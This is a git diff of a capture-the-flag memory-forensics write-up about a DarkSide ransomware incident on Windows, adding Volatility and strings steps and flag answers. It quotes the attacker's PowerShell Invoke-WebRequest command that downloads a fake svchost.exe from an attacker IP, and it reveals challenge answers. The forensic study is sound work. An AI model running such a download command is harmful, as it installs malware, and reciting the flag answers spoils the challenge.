@@ -86,77 +86,113 @@ cat Win2016x64_14393_hivelist.log |grep "SOFTWARE"
 
 - Flag 13:
 
-Q: <code>Using the provided word list, what is the password of the user "0xMohammed"?</code>
+Q: <code>What is the master key of the user "0xMohammed"?</code>
+
+
 
 - Flag 14:
 
-Q: <code>What is the name of the first malware detected by Windows Defender?</code>
+Q: <code>Using the provided word list, what is the password of the user "0xMohammed"?</code>
 
 - Flag 15:
 
-Q: <code>Provide the date and time when the attacker clicked send (submitted) the malicious email?</code>
+Q: <code>What is the name of the first malware detected by Windows Defender?</code>
 
 - Flag 16:
 
-Q: <code>What is the IP address and port on which the attacker received the reverse shell? IP:PORT</code>
+Q: <code>Provide the date and time when the attacker clicked send (submitted) the malicious email?</code>
 
 - Flag 17:
 
-Q: <code>Analyzing the reverse shell. What is the first argument given to InternetErrorDlg API?</code>
+Q: <code>What is the IP address and port on which the attacker received the reverse shell? IP:PORT</code>
 
 - Flag 18:
 
-Q: <code>What is the MITRE ID of the technique used by the attacker to achieve persistence?</code>
+Q: <code>Analyzing the reverse shell. What is the first argument given to InternetErrorDlg API?</code>
 
 - Flag 19:
 
-Q: <code>What is the attacker's C2 domain name?</code>
+Q: <code>What is the MITRE ID of the technique used by the attacker to achieve persistence?</code>
 
 - Flag 20:
 
-Q: <code>what is the name of the tool used by the attacker to collect AD information?</code>
+Q: <code>What is the attacker's C2 domain name?</code>
 
 - Flag 21:
 
+Q: <code>what is the name of the tool used by the attacker to collect AD information?</code>
+
+- Flag 22:```3140```
+
 Q: <code>What is the PID of the malicious process?</code>
 
-- Flag 22:
+We use the malfind plugin and see that the activity of this binary is very common in malwares that want to hide themselves.
+
+![](./Images/flag22.png)
+
+- Flag 23:```DarkSide```
 
 Q: <code>What is the family of ransomware?</code>
 
-- Flag 23:
+```bash
+mkdir dump
+volatility -f memory.dmp --profile=Win2016x64_14393 procdump -p 3140 -D dump
+md5sum dump/executable.3140.exe
+```
+
+We get the following md5:
+
+```
+573feeecd2f8d980dfa7a0f4bdcc3d6c
+```
+
+Use Virus total and get the flag:
+
+```
+https://www.virustotal.com/gui/file/f8dbe9a85ea88c79c7dbf0f884a85a2726f7fba874b9bded3e10bd084800cd5d
+```
+
+- Flag 24:```Invoke-WebRequest http://192.168.112.128:8000/svchost.exe -OutFile svchost.exe```
 
 Q: <code>What is the command invoked by the attacker to download the ransomware?</code>
 
-- Flag 24:
+A standard way to download things such as malwares from powershell we use Invoke-WebRequest
 
-Q: <code>Provide the number of ransomware process' privileges that are enabled by default?</code>
+```bash
+strings memory.dmp |grep -i "Invoke-WebRequest"
+```
+
+![](./Images/flag24.png)
 
 - Flag 25:
 
-Q: <code>What is the pool tag of the ransomware process?</code>
+Q: <code>Provide the number of ransomware process' privileges that are enabled by default?</code>
 
 - Flag 26:
 
-Q: <code>What is the address where the ransomware stored the 567-byte key under the malicious process' memory?</code>
+Q: <code>What is the pool tag of the ransomware process?</code>
 
 - Flag 27:
 
-Q: <code>What is the 8-byte word hidden in the ransomware process's memory?</code>
+Q: <code>What is the address where the ransomware stored the 567-byte key under the malicious process' memory?</code>
 
 - Flag 28:
 
-Q: <code>What is the virtual address of the device where the ransomware file where opened?</code>
+Q: <code>What is the 8-byte word hidden in the ransomware process's memory?</code>
 
 - Flag 29:
 
-Q: <code>What is the physical address where the ransomware file is stored in memory?</code>
+Q: <code>What is the virtual address of the device where the ransomware file where opened?</code>
 
 - Flag 30:
 
-Q: <code>What is the ransomware file's internal name?</code>
+Q: <code>What is the physical address where the ransomware file is stored in memory?</code>
 
 - Flag 31:
+
+Q: <code>What is the ransomware file's internal name?</code>
+
+- Flag 32:
 
 Q: <code>Analyzing the ransomware file. what is the API used to get the geographical location?</code>
 
